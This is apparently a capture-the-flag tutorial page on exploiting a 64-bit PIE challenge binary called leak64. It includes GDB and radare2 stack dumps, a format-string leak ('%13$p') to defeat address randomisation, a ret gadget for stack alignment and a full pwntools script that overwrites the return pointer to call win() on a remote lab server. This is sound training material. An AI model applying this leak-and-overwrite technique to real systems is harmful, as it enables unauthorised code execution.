---
description: PIE again, 64-bit edition.
---

# leak64

{% file src="../../.gitbook/assets/leak64.zip" %}

This binary is remarkably similar to the last one, with two major differences:

1. We can't forget about the `movaps` fault; we need a way to mitigate this.
2. Addresses are 64-bit but are formatted very similarly.

Since this is the same binary as the last one, just compiled in 64-bit, we will skip most of the static analysis.

### The Attack Vector

First, we need to find a leakable address on the stack. We'll use `gdb` to do this because, in 64-bit, it's often a high-valued offset.

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  x/10gx $rsp
0x7fffffffe3c0:	0x7025207025207025	0x2520702520702520
0x7fffffffe3d0:	0x2070252070252070	0x0000007025207025
0x7fffffffe3e0:	0x0000000000000000	0x0000000000000000
0x7fffffffe3f0:	0x00007fffffffe400	0x00005555555552ba
0x7fffffffe400:	0x0000000000000001	0x00007ffff7c29d90
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0x5614be16a233]> pxq 80 @ rsp
0x7ffdca27c5c0  0x7025207025207025  0x2520702520702520   %p %p %p %p %p %
0x7ffdca27c5d0  0x2070252070252070  0x7025207025207025   p %p %p %p %p %p
0x7ffdca27c5e0  0x0000000000702520  0x0000000000000000    %p.............
0x7ffdca27c5f0  0x00007ffdca27c600  0x00005614be16a2ba   ..'..........V..
0x7ffdca27c600  0x0000000000000001  0x00007f0a5c829d90   ...........\....
```
{% endtab %}
{% endtabs %}

We like the 8th value on the stack because it matches the format of the instructions nearby. If we check where it is:

{% tabs %}
{% tab title="GDB" %}
```nasm
gef➤  x/wx 0x00005555555552ba
0x5555555552ba <main+18>:	0x000000b8
```
{% endtab %}

{% tab title="Radare2" %}
```nasm
[0x5614be16a2ba]> afi. @ 0x00005614be16a2ba
main
[0x5614be16a2ba]> pdf @ main
┌ 25: int main (int argc, char **argv, char **envp);
│           0x5614be16a2a8      f30f1efa       endbr64
│           0x5614be16a2ac      55             push rbp
│           0x5614be16a2ad      4889e5         mov rbp, rsp
│           0x5614be16a2b0      b800000000     mov eax, 0
```
{% endtab %}
{% endtabs %}

This is our return pointer to `main()`! We can choose to leak this value and then overwrite it later. Our offset for the format string is going to be `13`.

{% hint style="danger" %}
#### _Uh, why?_

In 64-bit, there are 6 registers. The first is reserved for the format string so we don't count that one. This makes our offset `8+6-1=13`.
{% endhint %}

Now we have what we need. We can leak the address of `main() + 18` and then overwrite the return pointer with the address of `win()`.

```python
p.sendline(b'%13$p')
p.recvuntil(b'Nice to meet you ')
leak = int(p.recvline().strip(), 16)
elf.address = leak - (elf.sym.main + 18)
```

We also need a way to beat the `movaps` instruction. Because PIE is enabled, we can't hardcode gadgets. This means we have to find what function they're in, their offset, and then use that for our gadget. In this case, we can pull any `ret`, I tend to use `deregister_tm_clones()` because I know it's not problematic. We find our `ret` instruction:

```nasm
   0x0000555555555158 <+40>:	ret    
```

We can use this to build our payload:

```python
payload = b'A' * 0x38
payload += p64(elf.sym.deregister_tm_clones + 40)
payload += p64(elf.sym.win)
```

Then, we send the payload off and get the flag! Here is the full exploit:

{% code title="exploit.py" lineNumbers="true" %}
```python
from pwn import *

elf = context.binary = ELF('./leak64')
p = remote('vunrotc.cole-ellis.com', 7300)

p.recvline()

p.sendline(b'%13$p')
p.recvuntil(b'Nice to meet you ')
leak = int(p.recvline().strip(), 16)
elf.address = leak - (elf.sym.main + 18)

payload = b'A' * 0x38
payload += p64(elf.sym.deregister_tm_clones + 40)
payload += p64(elf.sym.win)

p.recvuntil(b'message?')
p.sendline(payload)
p.interactive()
```
{% endcode %}
